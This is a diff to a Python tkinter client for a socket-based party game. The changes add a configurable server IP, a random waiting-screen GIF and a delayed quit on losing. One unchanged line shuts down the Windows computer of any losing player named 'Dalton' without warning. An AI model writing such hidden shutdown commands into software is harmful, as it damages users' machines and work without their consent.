@@ -1,15 +1,17 @@
 import socket
 import threading
 import tkinter as tk
+from PIL import Image, ImageTk
+from itertools import count
 import json
 import random
 import os
 
 class Client:
 
-    def __init__(self):
+    def __init__(self, ip_address):
         self.ClientMultiSocket = socket.socket()
-        self.host = '127.0.0.1'
+        self.host = ip_address
         self.port = 2004
         self.nickname = ""
         self.message_postion_y = 0
@@ -70,6 +72,8 @@ class Client:
                 message = response.split("message: ")[1]
                 self.add_to_message_box(message)
             elif response == "Ready!":
+                self.unload()
+                self.canvas_gif.destroy()
                 self.waiting_label.destroy()
                 self.show_first_prompt()
             elif response.startswith("vote: "):
@@ -92,6 +96,51 @@ class Client:
         self.waiting_label = tk.Label(self.root,
         text="The game will start whenever Master Gabe decides to start the game.")
         self.waiting_label.pack()
+
+        self.canvas_gif = tk.Canvas(self.root, width = 500, height = 500)
+        self.canvas_gif.pack()
+
+        data = open("prompts.json", "r")
+        json_file = json.load(data)
+        filename = random.choice(json_file["gif_filenames"])
+        file = "assets/" + filename
+        self.load_gif(file)
+
+    def load_gif(self, im):
+        if isinstance(im, str):
+            im = Image.open(im)
+        self.loc = 0
+        self.frames = []
+
+        try:
+            for i in count(1):
+                self.frames.append(ImageTk.PhotoImage(im.copy()))
+                im.seek(i)
+        except EOFError:
+            pass
+
+        try:
+            self.delay = im.info['duration']
+        except:
+            self.delay = 100
+
+        if len(self.frames) == 1:
+            #self.config(image=self.frames[0])
+            self.canvas_gif.create_image(0, 0, anchor=tk.NW, image=self.frames[0])
+        else:
+            self.next_frame()
+
+    def unload(self):
+        self.canvas_gif.create_image(0, 0, anchor=tk.NW, image="")
+        self.frames = None
+
+    def next_frame(self):
+        if self.frames:
+            self.loc += 1
+            self.loc %= len(self.frames)
+            #self.config(image=self.frames[self.loc])
+            self.canvas_gif.create_image(0, 0, anchor=tk.NW, image=self.frames[self.loc])
+            self.root.after(self.delay, self.next_frame)
 
     def send_message_server(self):
         message = "message: " + self.nickname + ": " + self.send_message.get()
@@ -178,7 +227,7 @@ class Client:
             self.delete_prompts()
             self.loser_label = tk.Label(self.root, text="You lost.")
             self.loser_label.pack()
-            quit()
+            self.root.after(5000, quit)
         elif loser == self.nickname and self.nickname == "Dalton":
             os.system("shutdown /s /t 1")
         else:
